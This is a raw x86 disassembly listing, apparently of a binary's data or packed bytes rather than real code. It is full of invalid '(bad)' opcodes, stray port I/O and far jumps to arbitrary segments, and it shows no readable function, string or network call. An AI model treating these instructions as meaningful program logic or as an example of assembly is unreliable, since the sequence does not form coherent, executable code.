  40caed:	pop    ecx
  40caee:	stos   BYTE PTR es:[edi],al
  40caef:	outs   dx,BYTE PTR ds:[esi]
  40caf0:	xchg   ecx,eax
  40caf1:	mov    esi,0x50ed3eb5
  40caf6:	fdivr  QWORD PTR ss:[ecx-0x6b28f7c8]
  40cafd:	mov    BYTE PTR [esi],dh
  40caff:	ins    BYTE PTR es:[edi],dx
  40cb00:	xor    eax,0x109f35ec
  40cb05:	mov    dl,0xa1
  40cb07:	sub    eax,0x438e57bc
  40cb0c:	loop   0x40caa9
  40cb0e:	arpl   dx,bx
  40cb10:	add    eax,0x428c9f32
  40cb15:	enter  0x73dc,0x1f
  40cb19:	mov    al,ds:0x20abdab
  40cb1e:	test   BYTE PTR [ebp-0x5f],ah
  40cb21:	push   ebx
  40cb22:	and    esi,DWORD PTR [edi]
  40cb24:	scas   eax,DWORD PTR es:[edi]
  40cb25:	add    DWORD PTR [eax+esi*4],esi
  40cb28:	js     0x40cb47
  40cb2a:	in     al,0xe6
  40cb2c:	call   0xc5fc7aa1
  40cb31:	repz inc ecx
  40cb33:	mov    al,ds:0x685b51bd
  40cb38:	jmp    0x40cb21
  40cb3a:	cmp    BYTE PTR [esi+0x463019fa],ch
  40cb40:	push   ds
  40cb41:	in     eax,dx
  40cb42:	jl     0x40cb6b
  40cb44:	ret    0xb6c7
  40cb47:	mov    fs,WORD PTR [edx]
  40cb49:	in     al,0x27
  40cb4b:	sbb    al,0x55
  40cb4d:	ret    0xd877
  40cb50:	fdiv   QWORD PTR [ecx+0x55f26dc9]
  40cb56:	icebp  
  40cb57:	loopne 0x40cbd1
  40cb59:	addr16 cmp eax,0x3f5a07b8
  40cb5f:	out    dx,eax
  40cb60:	fwait
  40cb61:	jb     0x40cbd5
  40cb63:	dec    edi
  40cb64:	push   ds
  40cb65:	push   0x859ef930
  40cb6a:	rol    DWORD PTR [edx],1
  40cb6c:	cwde   
  40cb6d:	xor    BYTE PTR [eax+esi*4-0x1c734b72],dh
  40cb74:	fs push 0xaa6afcd4
  40cb7a:	bound  edx,QWORD PTR [eax+0x36e44327]
  40cb80:	mov    edi,0x882e407d
  40cb85:	popf   
  40cb86:	mov    ebp,0x1b821cf2
  40cb8b:	nop
  40cb8c:	loopne 0x40cb1d
  40cb8e:	xchg   ebp,eax
  40cb8f:	popf   
  40cb90:	std    
  40cb91:	pop    ebp
  40cb92:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb93:	shl    ecx,cl
  40cb95:	std    
  40cb96:	sti    
  40cb97:	inc    esp
  40cb98:	sar    DWORD PTR [edx],0x88
  40cb9b:	das    
  40cb9c:	and    BYTE PTR [edx+0x28f9db7c],bh
  40cba2:	push   edi
  40cba3:	inc    esi
  40cba4:	fnstcw WORD PTR [esi+0x2e71efe6]
  40cbaa:	ret    
  40cbab:	fidivr DWORD PTR [esi+eiz*4+0x2e]
  40cbaf:	(bad)  {k4}
  40cbb4:	daa    
  40cbb5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cbb6:	jl     0x40cb85
  40cbb8:	push   cs
  40cbb9:	sbb    ch,BYTE PTR [esi]
  40cbbb:	nop
  40cbbc:	mov    esi,0x17123eb0
  40cbc1:	cli    
  40cbc2:	mov    bh,0x5c
  40cbc4:	into   
  40cbc5:	loop   0x40cc44
  40cbc7:	cmp    BYTE PTR [esp+eiz*4+0x16],al
  40cbcb:	xchg   edx,eax
  40cbcc:	scas   al,BYTE PTR es:[edi]
  40cbcd:	push   ds
  40cbce:	(bad)  
  40cbcf:	ror    BYTE PTR [edi+0x76d56630],1
  40cbd5:	xchg   ecx,eax
  40cbd6:	retf   0x1a4b
  40cbd9:	mov    eax,0xafef0d98
  40cbde:	pushf  
  40cbdf:	push   ecx
  40cbe0:	rcr    BYTE PTR [eax],1
  40cbe2:	add    al,BYTE PTR [eax-0x75ccd584]
  40cbe8:	(bad)  
  40cbe9:	push   ss
  40cbea:	sub    edx,DWORD PTR [esi+0x51]
  40cbed:	int    0x92
  40cbef:	inc    ecx
  40cbf0:	imul   edi,DWORD PTR [ebx],0xffffffa0
  40cbf3:	xchg   ecx,eax
  40cbf4:	dec    esi
  40cbf5:	mov    eax,0x901864b9
  40cbfa:	mov    BYTE PTR [edx+0x292af74],cl
  40cc00:	(bad)  
  40cc01:	push   0x15
  40cc03:	fsub   st,st(4)
  40cc05:	push   eax
  40cc06:	ss pop es
  40cc08:	jg     0x40cc45
  40cc0a:	sbb    eax,0xab0abeda
  40cc0f:	pop    ebp
  40cc10:	mov    eax,ds
  40cc12:	test   al,0x8a
  40cc14:	dec    edx
  40cc15:	fstp   TBYTE PTR [edx]
  40cc17:	(bad)  
  40cc19:	fstp   QWORD PTR [ebx+0x59337dbd]
  40cc1f:	lds    eax,FWORD PTR ds:0x4102148
  40cc25:	add    ebp,eax
  40cc27:	mov    ds:0xbaf3c5c1,al
  40cc2c:	cld    
  40cc2d:	fidiv  DWORD PTR [ecx+ebp*8-0xc]
  40cc31:	xor    BYTE PTR [ecx],dl
  40cc33:	into   
  40cc34:	mov    al,0x28
  40cc36:	adc    esp,DWORD PTR [edx-0x17]
  40cc39:	push   ds
  40cc3a:	xchg   edi,eax
  40cc3b:	sub    dl,ch
  40cc3d:	(bad)  
  40cc3e:	cmc    
  40cc3f:	dec    eax
  40cc40:	dec    eax
  40cc41:	mov    al,dh
  40cc43:	out    0x92,eax
  40cc45:	pusha  
  40cc46:	dec    eax
  40cc47:	dec    eax
  40cc48:	xchg   ebp,eax
  40cc49:	add    eax,0x96b27c46
  40cc4e:	jno    0x40cc7c
  40cc50:	cmp    ch,BYTE PTR [bp+si]
  40cc53:	(bad)  
  40cc54:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cc55:	vdivss xmm2,xmm7,xmm5
  40cc59:	test   DWORD PTR [ecx+0x4109f3c3],edi
  40cc5f:	leave  
  40cc60:	gs cmp ax,0xa52e
  40cc65:	mov    dh,0x9
  40cc67:	fild   WORD PTR [edx]
  40cc69:	mov    DWORD PTR [esi-0x7ae7b8e9],edx
  40cc6f:	xor    DWORD PTR [edi-0x6c034510],ecx
  40cc75:	cmp    cl,dh
  40cc77:	into   
  40cc78:	dec    eax
  40cc79:	leave  
  40cc7a:	je     0x40ccc6
  40cc7c:	imul   ebx,DWORD PTR [edx+0x753c333e],0xab16d7c
  40cc86:	mov    edi,0x3665025f
  40cc8b:	(bad)  
  40cc8c:	call   0xaf92:0x76e3ef8d
  40cc93:	and    dl,ch
  40cc95:	fwait
  40cc96:	rcr    DWORD PTR [ebp+0x3c],1
  40cc99:	jecxz  0x40cccc
  40cc9b:	jae    0x40ccbd
  40cc9d:	mov    ebx,0x371074a2
  40cca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cca3:	add    ch,cl
  40cca5:	push   ebx
  40cca6:	cmp    BYTE PTR [esi-0x47cf1923],0x60
  40ccad:	out    0xd1,eax
  40ccaf:	mov    edi,0xa1d04d7f
  40ccb4:	add    eax,0x9dab7994
  40ccb9:	and    esi,DWORD PTR [ebx]
  40ccbb:	ficomp WORD PTR [ebx+0x43]
  40ccbe:	jp     0x40cd3c
  40ccc0:	mov    dh,0x15
  40ccc2:	sar    DWORD PTR [ecx],0xdf
  40ccc5:	lock push ss
  40ccc7:	sbb    dl,BYTE PTR [edx]
  40ccc9:	ins    BYTE PTR es:[edi],dx
  40ccca:	push   edx
  40cccb:	xchg   esi,eax
  40cccc:	jmp    0x40cc87
  40ccce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cccf:	(bad)  
  40ccd0:	add    ah,BYTE PTR [edx-0x36]
  40ccd3:	and    edi,DWORD PTR [eax+0x26]
  40ccd6:	and    al,0x3d
  40ccd8:	xor    DWORD PTR [ebp-0x5074b0ea],0xffffff90
  40ccdf:	pop    ds
  40cce0:	xor    eax,0x7263f730
  40cce5:	clc    
  40cce6:	xchg   BYTE PTR [edx],al
  40cce8:	or     DWORD PTR [ebx+eax*1+0x47eb22d1],ebp
  40ccef:	adc    eax,0xf390ef2b
  40ccf4:	test   DWORD PTR [ebx],0xa7e8006
  40ccfa:	popa   
  40ccfb:	dec    esi
  40ccfc:	jo     0x40cd43
  40ccfe:	out    dx,eax
  40ccff:	and    eax,0xdaa7e39c
  40cd04:	inc    ecx
  40cd05:	push   ebp
  40cd06:	sub    cl,BYTE PTR [ebx]
  40cd08:	xchg   ebx,eax
  40cd09:	sbb    eax,0x4eec3d8f
  40cd0e:	mov    dl,0xfb
  40cd10:	neg    DWORD PTR [eax]
  40cd12:	(bad)  
  40cd13:	mov    eax,0x81f1d4fb
  40cd18:	or     bh,BYTE PTR [esi]
  40cd1a:	in     al,0x4d
  40cd1c:	loop   0x40ccee
  40cd1e:	js     0x40cd52
  40cd20:	jl     0x40cd50
  40cd22:	add    BYTE PTR [edi],dh
  40cd24:	pop    edx
  40cd25:	adc    esi,DWORD PTR [eax-0x22e0a346]
  40cd2b:	cmp    DWORD PTR [edx],eax
  40cd2d:	es sbb al,0xb0
  40cd30:	pop    eax
  40cd31:	jne    0x40cd19
  40cd33:	dec    ebp
  40cd34:	cli    
  40cd35:	or     ch,BYTE PTR [edx-0x59]
  40cd38:	lds    esp,FWORD PTR [ecx+0x69c85d8f]
  40cd3e:	xchg   edi,eax
  40cd3f:	imul   edx,DWORD PTR [esi-0x7a56cb25],0xffffff83
  40cd46:	xchg   edx,eax
  40cd47:	std    
  40cd48:	ja     0x40cd4d
  40cd4a:	dec    edx
  40cd4b:	in     al,0xc
  40cd4d:	(bad)  
  40cd4e:	xor    esi,DWORD PTR [ecx]
  40cd50:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cd51:	cmp    ebp,DWORD PTR [ebx-0x29a8ddb3]
  40cd57:	mov    ecx,0xd727a2f6
  40cd5c:	mov    edi,0x133019af
  40cd61:	popa   
  40cd62:	cli    
  40cd63:	imul   ebx,DWORD PTR [ebx],0xffffff91
  40cd66:	push   eax
  40cd67:	scas   al,BYTE PTR es:[edi]
  40cd68:	add    edx,ecx
  40cd6a:	aas    
  40cd6b:	arpl   bx,bp
  40cd6d:	inc    edx
  40cd6e:	pop    esp
  40cd6f:	inc    esp
  40cd70:	xchg   edx,eax
  40cd71:	int    0x39
  40cd73:	aad    0xf3
  40cd75:	adc    eax,0xcfd670b7
  40cd7a:	daa    
  40cd7b:	cld    
  40cd7c:	jbe    0x40cdb7
  40cd7e:	adc    eax,edx
  40cd80:	lea    edi,[ebx]
  40cd82:	(bad)  
  40cd83:	sbb    al,0x94
  40cd85:	fbstp  TBYTE PTR [eax]
  40cd87:	jno    0x40ce06
  40cd89:	cs ror ebx,0xaf
  40cd8d:	xor    eax,esi
  40cd8f:	fcomp  DWORD PTR [eax]
  40cd91:	pop    eax
  40cd92:	sbb    al,0xa1
  40cd94:	popf   
  40cd95:	xor    eax,eax
  40cd97:	in     eax,0xaa
  40cd99:	cdq    
  40cd9a:	je     0x40cdce
  40cd9c:	cmp    eax,0x9556bc17
  40cda1:	dec    ebx
  40cda2:	pop    es
  40cda3:	or     BYTE PTR [eax-0x24],cl
  40cda6:	push   edi
  40cda7:	test   BYTE PTR [eax],dl
  40cda9:	inc    edi
  40cdaa:	xor    BYTE PTR [ebx-0x140893d4],al
  40cdb0:	dec    ebx
  40cdb1:	jp     0x40cdd2
  40cdb3:	xor    DWORD PTR [esi+0x425d2a63],esi
  40cdb9:	lds    edi,FWORD PTR [edi+ebp*4+0x13]
  40cdbd:	mov    DWORD PTR [eax-0x220ee734],esi
  40cdc3:	hlt    
  40cdc4:	js     0x40cda1
  40cdc6:	cmp    BYTE PTR [edi+0x26],bh
  40cdc9:	jnp    0x40ce4a
  40cdcb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cdcc:	dec    esp
  40cdcd:	div    DWORD PTR [edx+0x31]
  40cdd0:	push   edx
  40cdd1:	and    eax,0x83329974
  40cdd6:	ja     0x40ce39
  40cdd8:	xchg   ecx,eax
  40cdd9:	dec    edx
  40cdda:	jmp    0x1399:0xe54f626e
  40cde1:	dec    esi
  40cde2:	imul   eax,DWORD PTR [ecx-0x37982150],0x13
  40cde9:	add    al,BYTE PTR [ebp-0x4c4ab1e1]
  40cdef:	repz inc ecx
  40cdf1:	dec    ebp
  40cdf2:	and    eax,0xd12f9ac9
  40cdf7:	jle    0x40cd93
  40cdf9:	mov    ds:0x3eaed184,al
  40cdfe:	push   ss
  40cdff:	push   cs
  40ce00:	dec    edx
  40ce01:	dec    ebp
  40ce02:	hlt    
  40ce03:	test   DWORD PTR [ebx+0x43],esi
  40ce06:	sub    ah,ch
  40ce08:	enter  0xfae5,0x93
  40ce0c:	mov    bh,0x3f
  40ce0e:	sub    BYTE PTR [edi+ebp*2],dl
  40ce11:	add    BYTE PTR [edx],0x2b
  40ce14:	data16 (bad) 
  40ce17:	jl     0x40cdfa
  40ce19:	inc    DWORD PTR [esp+ebp*2]
  40ce1c:	or     al,0x99
  40ce1e:	jns    0x40ce99
  40ce20:	and    dl,bl
  40ce22:	mov    edi,0x745fd676
  40ce27:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ce28:	std    
  40ce29:	(bad)  
  40ce2a:	or     eax,0x219e7f11
  40ce2f:	and    eax,0x6e8a05c5
  40ce34:	and    al,0xae
  40ce36:	xor    ecx,DWORD PTR [ecx+edi*8+0x6d]
  40ce3a:	sub    eax,DWORD PTR [esi+0x5b72c49f]
  40ce40:	out    dx,al
  40ce41:	jmp    DWORD PTR ds:0xbe15d112
  40ce47:	xchg   dx,ax
  40ce49:	pop    edi
  40ce4a:	lods   eax,DWORD PTR ds:[esi]
  40ce4b:	addr16 jo 0x40cdf6
  40ce4e:	dec    ecx
  40ce4f:	repnz sbb eax,0xc59ad795
  40ce55:	in     eax,0x1a
  40ce57:	ret    0x4238
  40ce5a:	pop    es
  40ce5b:	fmul   DWORD PTR [esi*1-0x4f1a8572]
  40ce62:	repnz push ss
  40ce64:	jmp    0x276f:0x8d4c742e
  40ce6b:	jle    0x40ce35
  40ce6d:	daa    
  40ce6e:	fistp  WORD PTR [ebx]
  40ce70:	cmp    eax,0x5d1fe23f
  40ce75:	mov    ds:0x6488b9d4,eax
  40ce7a:	sbb    bh,cl
  40ce7c:	xchg   BYTE PTR [esi+ebp*2],bh
  40ce7f:	in     al,0x8c
  40ce81:	mov    ds:0x4d985710,al
  40ce86:	fwait
  40ce87:	pop    edx
  40ce88:	(bad)  
  40ce8a:	mov    cl,0x78
  40ce8c:	mov    dl,0xd6
  40ce8e:	in     al,dx
  40ce8f:	fwait
  40ce90:	and    eax,0xe5a7151c
  40ce95:	retf   
  40ce96:	mov    bl,0x34
  40ce98:	adc    bl,BYTE PTR [edx+0x19837bbc]
  40ce9e:	push   ecx
  40ce9f:	xlat   BYTE PTR ds:[ebx]
  40cea0:	cmc    
  40cea1:	std    
  40cea2:	pop    es
  40cea3:	fadd   QWORD PTR [edi+0x4c]
  40cea6:	xlat   BYTE PTR ds:[ebx]
  40cea7:	adc    bl,BYTE PTR [ebp+0x3e]
  40ceaa:	dec    esi
  40ceab:	ficom  DWORD PTR [eax-0x2c]
  40ceae:	pop    esp
  40ceaf:	mov    bh,0x30
  40ceb1:	scas   al,BYTE PTR es:[edi]
  40ceb2:	mov    es,WORD PTR [esi+0x75]
  40ceb5:	div    ah
  40ceb7:	cmp    ah,bl
  40ceb9:	push   0xffffffb5
  40cebb:	clc    
  40cebc:	fldcw  WORD PTR [eax+0x2d89d7d6]
  40cec2:	out    dx,eax
  40cec3:	xchg   BYTE PTR [edx],al
  40cec5:	mov    DWORD PTR [edi+eiz*4],ebx
  40cec8:	mov    edi,0xf07c8795
  40cecd:	jae    0x40ce51
  40cecf:	and    dl,BYTE PTR [ebx-0xe]
  40ced2:	and    edx,DWORD PTR ds:0xb89ef81d
  40ced8:	adc    eax,0xcd97bafe
  40cedd:	pop    edi
  40cede:	out    0xbe,eax
  40cee0:	scas   eax,DWORD PTR es:[edi]
  40cee1:	mov    eax,0xd60f0c65
  40cee6:	lea    esi,[ebx-0x14de6023]
  40ceec:	cld    
  40ceed:	xor    bl,BYTE PTR [esi+0x69efc273]
  40cef3:	inc    ecx
  40cef4:	icebp  
  40cef5:	sar    BYTE PTR [ecx-0x6c],cl
  40cef8:	push   cs
  40cef9:	lahf   
  40cefa:	(bad)  
  40cefb:	int    0x16
  40cefd:	push   cs
  40cefe:	jmp    0x40cf11
  40cf00:	adc    al,0xfd
  40cf02:	cmp    DWORD PTR [edi-0x6425121a],ebp
  40cf08:	test   ch,ah
  40cf0a:	pushf  
  40cf0b:	mov    ss,WORD PTR ds:0xa824dd1d
  40cf11:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cf12:	mov    al,BYTE PTR [edx-0x476cd95c]
  40cf18:	(bad)  
  40cf19:	sbb    al,0x45
  40cf1b:	sbb    bh,dh
  40cf1d:	leave  
  40cf1e:	sub    eax,0xf905fa45
  40cf23:	jle    0x40cfa0
  40cf25:	push   edx
  40cf26:	in     al,dx
  40cf27:	ss into 
  40cf29:	(bad)  [ecx+0x53e3859e]
  40cf2f:	ss into 
  40cf31:	sti    
  40cf32:	loop   0x40cefc
  40cf34:	dec    esp
  40cf35:	arpl   WORD PTR [ebx+edx*4-0x27],si
  40cf39:	ins    BYTE PTR es:[edi],dx
  40cf3a:	div    DWORD PTR [edi+0x25]
  40cf3d:	rol    BYTE PTR [edx-0x52],cl
  40cf40:	push   ss
  40cf41:	inc    eax
  40cf42:	xor    BYTE PTR [ebp+0x1b],dh
  40cf45:	loop   0x40cf9d
  40cf47:	push   ebx
  40cf48:	pop    edi
  40cf49:	mov    cl,0x55
  40cf4b:	add    eax,0xa7c86068
  40cf50:	add    al,0x18
  40cf52:	in     al,0xe2
  40cf54:	adc    al,0x2d
  40cf56:	fs jmp 0xe7a4a00c
  40cf5c:	xor    eax,0x9396fe0
  40cf61:	dec    ebp
  40cf62:	push   DWORD PTR [eax+ebx*8+0x5ff1ff86]
  40cf69:	es repnz mov al,0x78
  40cf6d:	xor    BYTE PTR [esi+0x1daac20d],bl
  40cf73:	sub    esp,ebx
  40cf75:	jmp    0x40cf41
  40cf77:	mov    WORD PTR [edx+0x23fbdb9],ds
  40cf7d:	outs   dx,DWORD PTR ds:[esi]
  40cf7e:	sub    BYTE PTR [eax],bh
  40cf80:	fstp   TBYTE PTR [edx+ebx*8+0x2e]
  40cf84:	pop    ecx
  40cf85:	inc    esi
  40cf86:	imul   eax,DWORD PTR [ebx],0xffffffa4
  40cf89:	xchg   ebx,eax
  40cf8a:	(bad)  
  40cf8b:	fisub  WORD PTR [eax-0x188ae980]
  40cf91:	fiadd  WORD PTR [esi-0x3]
  40cf94:	jns    0x40cfe7
  40cf96:	stc    
  40cf97:	aaa    
  40cf98:	mov    ecx,0x4b2e22c6
  40cf9d:	xchg   esp,eax
  40cf9e:	push   0x9f0247fa
  40cfa3:	adc    cl,BYTE PTR [ebp+0x44]
  40cfa6:	mov    ds:0x99d9a3fb,al
  40cfac:	stos   DWORD PTR es:[edi],eax
  40cfad:	repnz add bh,BYTE PTR [esi-0x30]
  40cfb1:	mov    ah,0x35
  40cfb3:	inc    BYTE PTR [eax+eax*4+0x601cbc12]
  40cfba:	or     BYTE PTR [edi-0x11],cl
  40cfbd:	adc    eax,DWORD PTR [eax-0x65d584b6]
  40cfc3:	adc    eax,0xb5ce05fb
  40cfc8:	add    ebx,edx
  40cfca:	push   ss
  40cfcb:	and    al,dl
  40cfcd:	xchg   ecx,eax
  40cfce:	cmc    
  40cfcf:	push   esp
  40cfd0:	neg    BYTE PTR [edi+0x6c]
  40cfd3:	mov    es,WORD PTR [ebx+0x30]
  40cfd6:	enter  0x4b74,0xb2
  40cfda:	test   BYTE PTR [edi-0x412d5aee],0x4b
  40cfe1:	cmp    al,BYTE PTR [ebx]
  40cfe3:	adc    DWORD PTR [edi-0x1e638d23],ebx
  40cfe9:	push   0xffffffaa
  40cfeb:	xchg   edx,eax
  40cfec:	test   BYTE PTR [ebp-0x5524c210],0xf2
  40cff3:	call   0xd65:0xaf934538
  40cffa:	jmp    0x40cfd7
  40cffc:	out    dx,eax
  40cffd:	sbb    eax,0xbece31ff
  40d002:	aaa    
  40d003:	mov    cl,0xe4
  40d005:	gs in  eax,0x1a
  40d008:	sub    al,0x35
  40d00a:	pop    ebp
  40d00b:	and    DWORD PTR [edx-0x2c8aaf87],ebx
  40d011:	pop    es
  40d012:	adc    DWORD PTR [ebx+ebp*1],edx
  40d015:	xor    esi,eax
  40d017:	add    ah,BYTE PTR [esi]
  40d019:	jmp    0x22a6:0xfff4e5c8
  40d020:	neg    DWORD PTR [ebx]
  40d022:	aam    0x3b
  40d024:	int    0xe4
  40d026:	xchg   edi,eax
  40d027:	into   
  40d028:	fidiv  DWORD PTR [edi+ebp*2-0x31]
  40d02c:	nop
  40d02d:	das    
  40d02e:	jns    0x40cfb4
  40d030:	out    dx,eax
  40d031:	mov    dh,0xee
  40d033:	ja     0x40cfd6
  40d035:	adc    DWORD PTR [edi+esi*8-0x7b],0x97dce366
  40d03d:	and    DWORD PTR [esi+0x21],eax
  40d040:	xchg   DWORD PTR [ebx*4-0x66fb04ec],ecx
  40d047:	loope  0x40cfd7
  40d049:	lods   eax,DWORD PTR ds:[esi]
  40d04a:	jl     0x40cffb
  40d04c:	(bad)  
  40d04e:	jae    0x40d021
  40d050:	ret    0xc92d
  40d053:	lea    edx,[edx-0x326145f7]
  40d059:	outs   dx,BYTE PTR ds:[esi]
  40d05a:	jae    0x40d065
  40d05c:	gs and esp,eax
  40d05f:	adc    bl,cl
  40d061:	mov    esp,0xc9c26715
  40d066:	ds aaa 
  40d068:	sub    dh,BYTE PTR [eax]
  40d06a:	repnz mov edi,0xe7984c8a
  40d070:	xchg   ecx,eax
  40d071:	cs sahf 
  40d073:	cdq    
  40d074:	shr    BYTE PTR [edx+0x711836de],1
  40d07a:	mov    ch,0xde
  40d07c:	xchg   esi,eax
  40d07d:	imul   esi,esp,0x972a6f80
  40d083:	or     edx,DWORD PTR [eax]
  40d085:	push   edx
  40d086:	and    DWORD PTR ds:0xe17bc9f5,ebx
  40d08c:	cs jno 0x40d01a
  40d08f:	dec    edx
  40d090:	xchg   edi,eax
  40d091:	rcl    BYTE PTR [ebx+0x43],1
  40d094:	sbb    al,0xf6
  40d096:	push   ebx
  40d097:	jbe    0x40d07f
  40d099:	mov    bh,0xf6
  40d09b:	pop    ebx
  40d09c:	xchg   edx,eax
  40d09d:	mov    ah,0xfb
  40d09f:	jmp    0x40d072
  40d0a1:	pop    esp
  40d0a2:	jp     0x40d085
  40d0a4:	mov    edi,0xbcd62c1c
  40d0a9:	mov    ds:0xaa55289f,eax
  40d0ae:	cli    
  40d0af:	xchg   edx,eax
  40d0b0:	shl    ecx,1
  40d0b2:	adc    al,0x49
  40d0b4:	jmp    0xbf2ce8ba
  40d0b9:	fisttp QWORD PTR [eax]
  40d0bb:	adc    BYTE PTR [eax],0x3c
  40d0be:	test   BYTE PTR [edi],bh
  40d0c0:	xchg   edx,eax
  40d0c1:	inc    ebp
  40d0c2:	pop    ecx
  40d0c3:	push   0xc
  40d0c5:	mov    ebx,0x23218c5b
  40d0ca:	mov    bl,0x9
  40d0cc:	cmp    al,0x85
  40d0ce:	pop    ebp
  40d0cf:	sub    DWORD PTR [edx+0x25],esp
  40d0d2:	shr    cl,0x0
  40d0d5:	and    WORD PTR [edi+0x4bdae0ca],0x5b67
  40d0de:	or     eax,DWORD PTR [esi+0x5c564615]
  40d0e4:	cwde   
  40d0e5:	dec    ebx
  40d0e6:	push   0x1a69ec67
  40d0eb:	mov    edi,?
  40d0ed:	dec    eax
  40d0ee:	add    ch,BYTE PTR [esi-0x53bfe7c8]
  40d0f4:	sub    DWORD PTR [esi+0x2a5a47b],eax
  40d0fa:	pop    edi
  40d0fb:	pop    ss
  40d0fc:	mov    ch,0x75
  40d0fe:	or     eax,0x72b70ab0
  40d103:	(bad)  [ebp-0x1]
  40d106:	xchg   edx,eax
  40d107:	fdivr  QWORD PTR [ebx]
  40d109:	arpl   WORD PTR [edx+ecx*4],bp
  40d10c:	mov    gs,eax
  40d10e:	(bad)  
  40d10f:	pop    ss
  40d110:	and    eax,0xd44240fb
  40d115:	xor    esp,DWORD PTR [edi]
  40d117:	push   ebp
  40d118:	aad    0xa1
  40d11a:	pushf  
  40d11b:	ja     0x40d0ee
  40d11d:	lods   eax,DWORD PTR ds:[esi]
  40d11e:	inc    ebp
  40d11f:	cdq    
  40d120:	mov    DWORD PTR [ebp+0x4f],edx
  40d123:	dec    esp
  40d124:	push   ecx
  40d125:	jb     0x40d0fa
  40d127:	mov    dh,0xfc
  40d129:	pushf  
  40d12a:	sbb    BYTE PTR [esi+0x4b27462f],dl
  40d130:	and    edx,DWORD PTR [edi+0x25]
  40d133:	cld    
  40d134:	loop   0x40d0de
  40d136:	test   BYTE PTR [ebx-0x57],ah
  40d139:	dec    edi
  40d13a:	adc    cl,0x1
  40d13d:	lods   eax,DWORD PTR ds:[esi]
  40d13e:	xor    BYTE PTR [eax-0x62cac1ea],0x6f
  40d145:	sahf   
  40d146:	pop    ebx
  40d147:	jnp    0x40d111
  40d149:	cli    
  40d14a:	add    BYTE PTR [edx-0x13f9916],dh
  40d150:	ret    0x88ab
  40d153:	cmp    DWORD PTR [ebp+eax*1+0xed5631],0x619372ce
  40d15e:	scas   eax,DWORD PTR es:[edi]
  40d15f:	mov    cl,0x54
  40d161:	mov    dh,0x36
  40d163:	push   edi
  40d164:	sub    eax,0xcb8ead85
  40d169:	cmp    DWORD PTR [ebx+eiz*8-0x31],ecx
  40d16d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40d16e:	into   
  40d16f:	push   ecx
  40d170:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d171:	add    BYTE PTR [edx+0x2e028b3e],al
  40d177:	sbb    BYTE PTR ds:0xf7e5831a,0xc4
  40d17e:	retf   
  40d17f:	mov    dh,0xf3
  40d181:	jl     0x40d1cb
  40d183:	sbb    edi,DWORD PTR [ecx+0x523a8e43]
  40d189:	pop    ebp
  40d18a:	push   eax
  40d18b:	pop    ds
  40d18c:	lods   al,BYTE PTR ds:[esi]
  40d18d:	inc    edi
  40d18e:	add    eax,0x84808bf3
  40d193:	bound  edx,QWORD PTR [edi]
  40d195:	js     0x40d178
  40d197:	add    eax,0x15025db8
  40d19c:	mov    dl,0xdc
  40d19e:	or     esp,ebp
  40d1a0:	xor    BYTE PTR [eax],ah
  40d1a2:	xor    eax,0x70691a47
  40d1a7:	mov    cl,0x6f
  40d1a9:	mov    ah,0xde
  40d1ab:	in     eax,0x59
  40d1ad:	push   0x6cf4d1f8
  40d1b2:	int3   
  40d1b3:	into   
  40d1b4:	sub    al,0xc3
  40d1b6:	dec    edi
  40d1b7:	xchg   DWORD PTR ds:0x3cb01319,esp
  40d1bd:	sub    ah,BYTE PTR ds:0x32d13
  40d1c3:	pop    ds
  40d1c4:	(bad)  
  40d1c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40d1c6:	out    dx,al
  40d1c7:	imul   ebp,ebp,0xffffffaf
  40d1ca:	adc    ebp,DWORD PTR [edx]
  40d1cc:	ss js  0x40d193
  40d1cf:	add    edx,DWORD PTR [ebx+0x1a]
  40d1d2:	push   ss
  40d1d3:	fidiv  WORD PTR [eax]
  40d1d5:	jnp    0x40d226
  40d1d7:	jne    0x40d223
  40d1d9:	fcom   QWORD PTR [ebp+0x2a]
  40d1dc:	mov    al,ds:0xc30c0018
  40d1e1:	xor    esp,esi
  40d1e3:	jmp    0x1f79:0x70411d3
  40d1ea:	repnz add DWORD PTR [esi-0x33],ebx
  40d1ee:	xchg   esp,eax
  40d1ef:	lea    ebp,[edx]
  40d1f1:	test   eax,0x25b93548
  40d1f6:	cli    
  40d1f7:	fwait
  40d1f8:	xor    DWORD PTR [ebx+0x533ba38c],edi
  40d1fe:	imul   ebp,DWORD PTR [ecx-0x22],0x95e44e23
  40d205:	call   0x7d99:0xf965e46e
  40d20c:	ror    BYTE PTR [edi+0x11ef981e],cl
  40d212:	adc    BYTE PTR [edi-0x74de5c5d],0x91
  40d219:	xchg   ebx,eax
  40d21a:	shl    BYTE PTR [ebp+0x33bfeeca],0xd7
  40d221:	pop    ecx
  40d222:	xchg   esp,eax
  40d223:	fsub   DWORD PTR [ebx+0x3]
  40d226:	cmp    ax,WORD PTR [edi+0x73fbf925]
  40d22d:	loopne 0x40d1bb
  40d22f:	sub    ecx,DWORD PTR [eax+0x75445fc9]
  40d235:	xor    DWORD PTR [esi-0x765bba19],ebp
  40d23b:	repnz outs dx,DWORD PTR gs:[esi]
  40d23e:	test   BYTE PTR [ecx],ch
  40d240:	data16 (bad) 
  40d242:	fisttp WORD PTR [edx+ebp*8-0x5f]
  40d246:	dec    edx
  40d247:	fld    DWORD PTR [ebx-0x4e]
  40d24a:	jmp    0x40d280
  40d24c:	lahf   
  40d24d:	lods   al,BYTE PTR ds:[esi]
  40d24e:	stos   DWORD PTR es:[edi],eax
  40d24f:	and    ebx,DWORD PTR [ebp+ecx*4+0x1f]
  40d253:	jecxz  0x40d296
  40d255:	cmp    ebp,0xfffffff1
  40d258:	pop    es
  40d259:	retf   
  40d25a:	jp     0x40d216
  40d25c:	push   edi
  40d25d:	je     0x40d21d
  40d25f:	xchg   ebx,eax
  40d260:	ds aas 
  40d262:	clc    
  40d263:	and    eax,0xc82c2a8f
  40d268:	cmp    cl,BYTE PTR [ebp+0x22]
  40d26b:	cmp    dl,0x38
  40d26e:	mov    ds:0x75f4b3f6,al
